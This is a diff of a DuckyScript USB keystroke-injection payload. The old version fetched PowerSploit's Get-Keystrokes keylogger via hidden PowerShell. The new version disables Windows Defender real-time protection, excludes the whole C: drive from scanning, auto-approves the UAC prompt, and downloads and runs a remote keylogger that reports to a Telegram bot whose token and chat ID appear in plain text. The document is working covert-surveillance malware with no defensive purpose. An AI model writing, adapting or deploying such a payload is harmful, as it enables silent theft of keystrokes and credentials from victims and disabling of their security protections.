@@ -1,16 +1,12 @@
-DELAY 2000
+REM Here you will have to put your telegram bot details
+DEFINE #BOT_TOKEN 8665518944:AAGN4ncP375c0rNFEsXiaOBN9G-0scYJ2qg
+DEFINE #CHAT_ID 8298670259
+DEFINE #SCRIPT_URL https://raw.githubusercontent.com/PandaPoodle/keylogger/refs/heads/main/Keylogg.txt
+
+DELAY 1500
 GUI r
 DELAY 500
-STRING powershell -WindowStyle hidden
-ENTER
-DELAY 1500
-STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')
-ENTER
-DELAY 400
-STRING Get-Keystrokes -LogPath $env:temp\key.txt
-ENTER
-DELAY 200
-GUI r
-DELAY 300
-STRING powershell -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('http://yourserver/mail.ps1')
-ENTER
+STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\'; Start-Sleep -Seconds 5; powershell -w h -NoP -Ep Bypass -Command '$bt='#BOT_TOKEN'; $ci='#CHAT_ID'; irm #SCRIPT_URL | iex'"
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
